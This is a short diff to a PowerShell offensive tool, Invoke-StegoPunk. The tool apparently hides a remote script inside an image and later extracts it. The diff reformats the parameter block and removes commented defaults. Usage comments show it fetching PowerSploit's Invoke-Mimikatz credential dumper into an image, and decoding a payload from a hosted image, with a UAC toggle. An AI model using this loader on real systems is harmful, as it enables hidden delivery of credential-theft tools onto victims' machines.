@@ -3,13 +3,8 @@
 function Invoke-StegoPunk {
 
 
-          Param (
-             #[string]$Mode = "encryption",
-             #[string]$Fileurl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1",
-             #[Parameter(Mandatory=$True)]
-            #[string]$ImageUrl = "http://www.holidayguru.it/wp-content/uploads/2015/10/polignano_puglia.png",
-            #[Parameter(Mandatory=$True)]
-            #[string]$ImagepathName = "c:\users\v.delaurentis\desktop\pippo.png"
+   Param (
+
             [ValidateSet(“encryption”,”decryption”)] 
             [string]$Mode,
             [string]$Fileurl,
@@ -18,7 +13,7 @@ function Invoke-StegoPunk {
             [ValidateSet(“on”,”off”)]
             [string]$b_UAC = "on"
             
-       )  
+          )  
 #invoke-stegopunk -mode encryption -fileurl 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1' -imageurl 'http://www.holidayguru.it/wp-content/uploads/2015/10/polignano_puglia.png' -imagename 'mix.png'                  
 #invoke-stegopunk -mode decryption -b_UAC on -imageurl 'https://4.bp.blogspot.com/-e4-qZIRq0l0/VrNFM0tL1CI/AAAAAAAAAE4/nGUHo5FCs9U/s1600/qwerty.png'     
       if ($Mode -eq "encryption")
